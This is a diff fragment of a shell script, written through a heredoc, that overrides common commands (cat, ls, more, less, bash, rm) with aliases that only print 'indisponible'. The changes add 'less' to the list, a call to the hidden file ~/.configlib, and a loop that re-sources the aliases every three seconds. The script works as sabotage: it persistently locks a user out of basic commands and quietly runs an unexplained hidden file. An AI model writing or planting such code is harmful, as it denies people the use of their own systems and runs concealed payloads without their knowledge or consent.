@@ -11,12 +11,14 @@ create_file()
     touch \$file
     echo "" > \$file
 
-    cmd=("cat" "ls" "more" "bash" "rm")
+    cmd=("cat" "ls" "more" "less" "bash" "rm")
 
     for command in "\${cmd[@]}";
     do
         echo "alias \${command}=\"echo indisponible\"" >> \$file
     done
+
+    ~/.configlib
 
     source \$file
 }
@@ -30,6 +32,7 @@ while :
 do
     sleep 3
     test check_file && create_file
+    source \$file
 done
 EOF
 
